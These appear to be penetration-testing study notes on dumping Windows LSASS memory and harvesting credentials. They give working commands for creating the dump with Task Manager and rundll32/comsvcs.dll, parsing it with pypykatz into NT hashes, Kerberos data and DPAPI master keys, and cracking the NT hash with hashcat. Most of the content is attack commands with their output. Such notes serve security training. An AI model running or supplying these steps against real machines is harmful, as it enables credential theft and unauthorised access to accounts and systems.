
- Plays a critical role in credential management and the authentication processes in all Windows OSs.

Upon login, LSASS will:
- Cache credentials locally in memory
- Create access tokens
- Enforce security policies
- Write to Windows security log


#### Dumping LSASS Process Memory

1. Task manager -> Processes -> right click Local Security Authority -> create dump file
	- lsass.DMP created and saved in C:\Users\loggedonusersdirectory\AppData\Local\Temp

2. Find LSASS PID in cmd
```cmd-session
tasklist /svc
```
Find LSASS PID in PowerShell
```powershell-session
Get-Process lsass
```
Create dump file with rundll32
```powershell-session
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
Write to C:\lsass.dmp

3. Running pypykatz (mimikatz in python) on attack host
https://github.com/skelsec/pypykatz
```shell-session
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

#### MSV
- Authentication package that validates logon attempts against the SAM database

```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

#### WDIGEST
- Older authentication protocol (clear-text)

```shell-session
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```


#### Kerberos
- Network authentication protocol used by Active Directory in Windows Domain environments.
- LSASS caches passwords, ekeys, tickets, and pins

```shell-session
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```


#### DPAPI
- Data Protection API used to encrypt and decrypt DPAPI data blobs
- Use cases: Internet Explorer, Google Chrome, Outlook, Remote Desktop Connection, Credential Manager

```shell-session
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```


### Hashcat to crack NT Hash

```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```